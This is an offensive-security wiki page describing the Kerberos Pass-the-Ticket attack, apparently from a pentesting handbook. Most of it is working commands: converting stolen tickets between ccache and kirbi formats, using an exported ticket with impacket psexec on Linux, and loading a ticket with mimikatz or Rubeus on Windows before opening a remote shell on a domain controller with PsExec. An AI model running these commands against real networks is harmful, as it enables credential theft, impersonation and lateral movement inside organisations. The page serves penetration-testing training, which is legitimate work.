# Pass the Ticket

## Pass The Ticket \(PTT\)

This kind of attack is similar to Pass the Key, but instead of using hashes to request a ticket, the ticket itself is stolen and used to authenticate as its owner.

**Read**:

* [Harvesting tickets from Windows](../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
* [Harvesting tickets from Linux](../../pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swaping Linux and Windows tickets between platforms**

The [ticket\_converter](https://github.com/Zer1t0/ticket_converter) script. The only needed parameters are the current ticket and the output file, it automatically detects the input ticket file format and converts it. For example:

```text
root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi
root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```

[Kekeo](https://github.com/gentilkiwi/kekeo), to convert them in Windows. This tool was not checked due to requiring a license in their ASN1 library, but I think it is worth mentioning.

### Pass The Ticket Attack

{% code title="Linux" %}
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Windows" %}
```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
{% endcode %}

